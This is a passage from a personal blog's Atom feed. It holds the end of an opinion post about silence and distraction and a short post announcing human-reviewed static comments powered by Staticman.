&lt;p&gt;“The quieter you become, the more you can hear.” - Ram Dass.&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="opinion" /><summary type="html">I find silence to be grossly underestimated. We live in an era of permanent distraction. Companies use loud, aggressive marketing in the form of advertisements to grab your attention and get you to buy whatever it is they’re selling. Our smartphones have become distraction devices that instead of boosting our productivity, and increase our focus, are loaded of applications that send notifications indiscriminately, connecting us to real-time events instantly.</summary></entry><entry><title type="html">Comments enabled!</title><link href="http://localhost:4000/2018/05/26/enabled-comments" rel="alternate" type="text/html" title="Comments enabled!" /><published>2018-05-26T23:10:50+02:00</published><updated>2018-05-26T23:10:50+02:00</updated><id>http://localhost:4000/2018/05/26/enabled-comments</id><content type="html" xml:base="http://localhost:4000/2018/05/26/enabled-comments">&lt;p&gt;The blog now supports comments!&lt;/p&gt;

&lt;p&gt;They’re human-reviewed, so inappropriate comments will not be published.&lt;/p&gt;

&lt;p&gt;And the best part is that they’re fully static comments. No JavaScript required, no tracking plugins and no external comment systems!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://staticman.net/&quot;&gt;Staticman&lt;/a&gt; is truly awesome.&lt;/p&gt;

&lt;p&gt;Give it a try if you want, but please don’t comment spam or garbage.&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><summary type="html">The blog now supports comments!</summary></entry></feed>